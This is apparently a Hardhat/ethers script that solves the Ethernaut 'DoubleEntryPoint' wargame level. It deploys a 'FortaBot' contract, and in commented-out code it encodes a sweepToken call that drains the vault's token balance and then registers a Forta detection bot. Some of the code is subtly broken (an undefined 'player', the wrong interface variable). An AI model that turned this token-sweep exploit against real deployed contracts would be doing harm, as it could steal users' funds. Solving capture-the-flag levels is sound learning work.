import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackDoubleEntry = async () => {
    // change contract addresses here.
    const doubleEntryAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    const attackAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from
    // Read more:
    // https://docs.soliditylang.org/en/latest/abi-spec.html#contract-abi-specification

    // deploy safeguard contract here
    // const deployed = await deployContract(hre, "FortaBot", args);
    // alternative below
    console.log("Deploying attack contract FortaBot...");
    const Factory = await ethers.getContractFactory("FortaBot", deployer);
    const fortaBot = await Factory.deploy();
    console.log(fortaBot);
    console.log(`Contract deployed to ${fortaBot.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (fortaBot.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: fortaBot.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [],
            name: "cryptoVault",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "balanceOf",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "delegatedFrom",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "forta",
            outputs: [{ internalType: "contract Forta", name: "", type: "address" }],
            stateMutability: "nonpayable",
            type: "function",
        },
    ];

    // wallet and contract here
    // const contract = await ethers.getContractAt(ABI, doubleEntryAddress);
    // // using my custom rpc stored in .env (for privacy)
    // const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    // const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    // const PRIVATE_KEY =
    //     process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
    // const wallet = new Wallet(PRIVATE_KEY, provider);

    // const vault = await contract.cryptoVault()
    // console.log("cryptoVault address: ", vault)

    // // Check initial balance (100 DET)
    // let vaultBalance = await contract.balanceOf(vault).toString() // '100000000000000000000'
    // console.log("Balance of vault is ", vaultBalance)

    // const legacyToken = await contract.delegatedFrom()
    // console.log("delegatedFrom address:", legacyToken)

    // etherjs
    // console.log("Encoding function signature for sweepToken...");
    // const iface = new ethers.utils.Interface(["function sweepToken(address token)"]);
    // const sweepSig = iface.encodeFunctionData("sweepToken", [legacyToken]);

    // // Send exploit transaction
    // console.log("Sending transaction...")
    // const tx1 = await wallet.sendTransaction({ from: player, to: vault, data: sweepSig })
    // console.log(tx1)

    // // Check balance (0 DET)
    // vaultBalance = await contract.balanceOf(vault).toString()  // '0'
    // console.log("Balance of vault is ", vaultBalance)

    // // FortaDetectionBot
    // const botAddr = fortaBot.address;

    // // Forta contract address
    // const forta = await contract.forta()
    // console.log("Forta address is: ", forta)

    // etherjs
    // console.log("Encoding function signature for setDetectionBot...");
    // const ifaceBot = new ethers.utils.Interface(["function setDetectionBot(address detectionBotAddress)"]);
    // const setBotSig = iface.encodeFunctionData("setDetectionBot", [botAddr]);

    // // Send the transaction setting the bot
    // console.log("Sending transaction...")
    // const tx2 = await wallet.sendTransaction({from: player, to: forta, data: setBotSig })
    // console.log(tx2)

    // console.log(txReceipt1);
};

attackDoubleEntry()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
